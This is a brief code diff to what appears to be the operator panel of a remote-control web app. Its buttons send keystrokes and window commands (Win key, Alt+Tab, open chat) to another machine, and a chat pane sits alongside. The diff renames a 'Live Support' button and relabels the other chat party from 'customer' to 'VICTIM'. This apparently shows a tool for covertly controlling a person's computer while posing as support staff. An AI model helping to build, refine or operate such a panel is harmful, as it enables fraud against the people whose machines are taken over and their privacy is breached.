@@ -72,7 +72,7 @@ app.get('/', (req, res) => {
         </select>
         <button onclick="sendCmd('WIN')">Win</button>
         <button onclick="sendCmd('TAB')">Alt+Tab</button>
-        <button onclick="toggleChat()" style="background: #1877f2; font-weight: bold;">💬 Live Support</button>
+        <button onclick="toggleChat()" style="background: #1877f2; font-weight: bold;">Chat</button>
         <button onclick="sendCmd('OPEN_CHAT')">Pencereyi Ac</button>
         <button onclick="toggleFs()">⛶</button>
     </div>
@@ -165,7 +165,7 @@ app.get('/', (req, res) => {
         function appendMsg(text, who) {
             const el = document.createElement('div');
             el.className = 'msg ' + (who === 'me' ? 'msg-me' : 'msg-them');
-            el.innerText = (who === 'me' ? 'Sen: ' : 'Musteri: ') + text;
+            el.innerText = (who === 'me' ? 'Sen: ' : 'VICTIM: ') + text;
             chatMsgs.appendChild(el);
             chatMsgs.scrollTop = chatMsgs.scrollHeight;
         }
